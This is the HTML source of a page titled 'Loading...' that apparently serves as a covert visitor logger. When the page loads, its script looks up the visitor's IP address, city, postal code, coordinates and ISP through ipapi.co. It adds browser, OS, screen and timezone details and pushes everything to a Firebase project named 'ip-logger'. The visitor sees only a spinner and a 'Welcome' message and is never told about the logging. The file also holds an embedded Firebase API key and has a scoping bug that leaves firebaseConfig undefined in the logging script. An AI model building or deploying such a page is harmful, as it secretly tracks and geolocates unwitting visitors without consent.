<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 4px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="loader" id="loader"></div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script type="module">
  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-analytics.js";
  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  const firebaseConfig = {
    apiKey: "AIzaSyCnomrcylfEZB15fJjotyhzn9qI_PuNqV8",
    authDomain: "ip-logger-34bcb.firebaseapp.com",
    projectId: "ip-logger-34bcb",
    storageBucket: "ip-logger-34bcb.firebasestorage.app",
    messagingSenderId: "997462036603",
    appId: "1:997462036603:web:9d5afd4e69bfda89d792de",
    measurementId: "G-6L0VM63H81"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
</script>
    <script>

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown", os = "Unknown";
            
            if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Safari")) browser = "Safari";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Edge")) browser = "Edge";
            
            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "MacOS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

            return {
                userAgent: ua,
                browser: browser,
                os: os,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct',
                timestamp: Date.now()
            };
        }

        async function logVisitor() {
            try {
                // Get IP and location
                const res = await fetch('https://ipapi.co/json/');
                const ipData = await res.json();
                
                const deviceInfo = getDeviceInfo();
                
                const logData = {
                    ip: ipData.ip,
                    city: ipData.city,
                    region: ipData.region,
                    country: ipData.country_name,
                    countryCode: ipData.country_code,
                    postal: ipData.postal,
                    latitude: ipData.latitude,
                    longitude: ipData.longitude,
                    isp: ipData.org,
                    ...deviceInfo
                };

                // Push to Firebase
                await database.ref('logs').push(logData);
                
                // Redirect or show content after logging
                document.getElementById('loader').style.display = 'none';
                document.body.innerHTML = `
                    <div style="text-align:center;color:white;padding:40px;">
                        <h1>Welcome</h1>
                        <p>Thanks for visiting!</p>
                    </div>
                `;

            } catch (err) {
                console.error('Logging failed:', err);
                // Still log what we can
                await database.ref('logs').push({
                    ...getDeviceInfo(),
                    ip: 'unknown',
                    error: err.message
                });
            }
        }

        // Auto-log on page load
        window.addEventListener('load', logVisitor);
    </script>
</body>
</html>
